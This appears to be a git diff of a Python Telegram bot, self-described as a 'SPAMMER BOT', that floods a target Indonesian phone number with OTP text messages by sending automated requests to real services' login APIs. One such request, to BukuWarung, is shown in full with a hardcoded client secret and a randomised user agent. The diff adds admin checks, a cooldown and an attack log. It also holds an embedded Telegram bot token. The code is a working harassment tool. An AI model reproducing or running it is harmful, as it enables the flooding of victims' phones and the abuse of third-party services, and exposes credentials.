@@ -14,7 +14,12 @@ from fake_useragent import UserAgent
 from bs4 import BeautifulSoup as bs
 import random
 import string
+import datetime
+import pytz
 ua = UserAgent()
+
+# WAKTU INDONESIA (WIB)
+dt = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
 
   
 updater = Updater("5329815334:AAHxG2ZlEsxMgZYx-uqIkRpAV0uEqW42zXk",
@@ -22,33 +27,62 @@ updater = Updater("5329815334:AAHxG2ZlEsxMgZYx-uqIkRpAV0uEqW42zXk",
   
 
 
+# LIST ADMIN
+admins = [854756142, 5014001714]
 
 
 
+# COOLDOWN
+throttle_data = {
+    'minutes': 1,
+    'last_time': None
+}
+
+def throttle(func):
+    def wrapper(*args, **kwargs):
+        now = datetime.datetime.now()
+        delta = now - datetime.timedelta(minutes=throttle_data.get('minutes', 30))
+        last_time = throttle_data.get('last_time')
+        if not last_time:
+            last_time = delta
+
+        if last_time <= delta:
+            throttle_data['last_time'] = now
+            func(*args, **kwargs)
+        else:
+            return not_allowed(*args)
+    return wrapper
 
 
+def not_allowed(update, context):
+    update.message.reply_text(text="**! SABAR BOSS PERINTAH NYA DELAY 1 MENIT !**")
+
+# COOLDOWN
 
 
 def start(update: Update, context: CallbackContext):
-    if update.message.from_user.id == 854756142:
+    if update.message.from_user.id in admins:
         update.message.reply_text(
             f"===SPAMMER BOT BY HECKA===\n\nHalooo Boss Selamat Datang ^_^\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}")
     else:
         update.message.reply_text("MAAF ANDA SIAPA YAA???")
+        context.bot.send_message(chat_id=854756142, text=f"! ADA PENYUSUP !\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}")
 
 
 def help(update: Update, context: CallbackContext):
-    if update.message.from_user.id == 854756142:
+    if update.message.from_user.id in admins:
         update.message.reply_text("""Available Commands :-
         /spam [No Hp] - (Tidak Menggunakan Angka Awalan 0 atau +62)
         /help - List Perintah""")
     else:
         update.message.reply_text("MAAF ANDA SIAPA YAA???")
+        context.bot.send_message(chat_id=854756142, text=f"! ADA PENYUSUP !\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}")
   
 
-  
+
+@throttle
 def spam(update: Update, context: CallbackContext):
-    if update.message.from_user.id == 854756142:
+    if update.message.from_user.id in admins:
         nohp = ' '.join(context.args)
         if nohp.isdigit():
             if len(nohp) < 10 or len(nohp) > 14 or nohp.startswith("0") or nohp.startswith("62") or nohp.startswith("+62"):
@@ -477,7 +511,7 @@ def spam(update: Update, context: CallbackContext):
 
 
 
-
+            
                 def sp25():
                     bw=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",data=json.dumps({"action":"LOGIN_OTP","clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn","countryCode":"62","deviceId":"baeab7ac-86d2-4c2a-ac1c-6392876c2930R","method":"SMS","phone": "0"+nohp}),headers={"Host":"api-v2.bukuwarung.com","accept":"application/json","x-app-version-name":"3.22.0","x-app-version-code":"4217","x-timezone":"Asia/Jakarta","authorization":"Bearer null","content-type":"application/json; charset=UTF-8","accept-encoding":"gzip","user-agent":ua.random}).text
                     if "OTP_SENT" in bw:
@@ -485,7 +519,11 @@ def spam(update: Update, context: CallbackContext):
                     else:
                         update.message.reply_text("ERROR SPAMMING [25] [STATUS => GAGAL NGAB :(")
 
+
                 # FUNCTION SPAMMER
+            try:
+                context.bot.send_message(chat_id=854756142, text=f"LOG PENYERANGAN :\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}\n\nMELAKUKAN PENYERANGAN TERHADAP NOMOR => 0{nohp}\n\nTANGGAL | WAKTU : {dt.strftime('%d-%m-%Y | %H:%M:%S %Z %z')}")
+                sleep(1)
                 context.bot.send_message(chat_id=update.effective_chat.id, text=f"MEMULAI PENYERANGAN KE NOMOR TELEPON ==> 0{nohp}")
                 sleep(1)
                 update.message.reply_text("==============STARTING==============")
@@ -540,13 +578,15 @@ def spam(update: Update, context: CallbackContext):
                 sleep(1)
                 sp25()
                 sleep(1)
-                update.message.reply_text(f"===========SELESAI===========\n\nNOMOR TARGET => {nohp}")
+                update.message.reply_text(f"===========SELESAI===========\n\nNOMOR TARGET => 0{nohp}")
+            except:
+                update.message.reply_text(f"! PENYERANGAN DI HENTIKAN DIKARENAKAN TERDAPAT ERROR PADA SAAT MELAKUKAN PENYERANGAN KE NOMOR => 0{nohp} !")
 
         else:
             update.message.reply_text("MASUKKIN ANGKA BOSS, SEJAK KAPAN NOMOR TELEPON JADI HURUF??? :(")
     else:
         update.message.reply_text("MAAF ANDA SIAPA YAA???")
-  
+
   
 
   
@@ -561,4 +601,5 @@ updater.dispatcher.add_handler(CommandHandler('spam', spam))
 
 print("BOT BERJALAN....")
 updater.start_polling()
+
 
